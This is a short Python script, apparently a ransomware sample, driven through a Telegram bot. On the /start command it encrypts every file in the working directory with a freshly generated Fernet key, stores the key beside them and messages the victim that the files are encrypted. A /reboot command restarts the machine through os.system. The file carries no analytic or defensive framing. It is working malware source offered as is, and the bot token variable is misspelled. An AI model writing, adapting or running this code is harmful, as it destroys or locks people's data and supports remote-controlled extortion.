#!/usr/bin/env python3
import telebot
import os
from certifi import contents
from cryptography.fernet import Fernet
bot = telebot.TeleBot(TOCKEN)
@bot.message_handler(commands='start')
def start(message):
	bot.send_message(message.chat.id, "Don't panic your files already Encrypted! If you want you can reboot pc /reboot", parse_mode='html')
	files = []
	for file in os.listdir():
		if file == "malware.py" or file == "thekey.key":
			continue
		if os.path.isfile(file):
			files.append(file)
	print(*files)
	key = Fernet.generate_key()
	with open("thekey.key", "wb") as thekey:
		thekey.write(key)
	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_encrypted = Fernet(key).encrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_encrypted)
@bot.message_handler(commands='reboot')
def reboot(message):
	bot.send_message(message.chat.id, "Laptop restarting....", parse_mode='html')
	bot.send_message(message.chat.id, "All Done!", parse_mode='html')
	os.system('reboot')

bot.polling(none_stop=True)
